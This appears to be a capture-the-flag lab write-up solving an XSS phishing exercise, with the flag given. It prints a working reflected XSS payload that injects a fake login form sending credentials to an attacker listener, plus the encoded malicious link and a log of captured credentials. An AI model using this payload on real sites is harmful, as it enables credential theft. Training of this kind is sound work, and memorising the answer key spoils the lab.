# Phishing
## Questions
1. Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag. **Answer: HTB{r3f13c73d_cr3d5_84ck_2_m3}**
   - Find a working payload: 
        ```
        puca' id="x"><script>document.write('<h3>Please login to continue</h3><form action="http://10.10.14.76:8000"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();document.getElementById('x').remove();</script><!--
        ```
   - Start simple listening server to capture the request:
        ```
        $ python -m http.server
        ```
   - Send this link to `/phishing/send.php`: 
        ```
        http://10.129.8.10/phishing/index.php?url=puca%27+id%3D%22x%22%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3D%22http%3A%2F%2F10.10.14.76%3A8000%22%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3Bdocument.getElementById%28%27x%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
        ```
   - Check log to capture credentials:
        ```
        10.129.8.10 - - [26/May/2026 03:42:49] "GET /?username=admin&password=p1zd0nt57341myp455&submit=Login HTTP/1.1" 200 -
        ```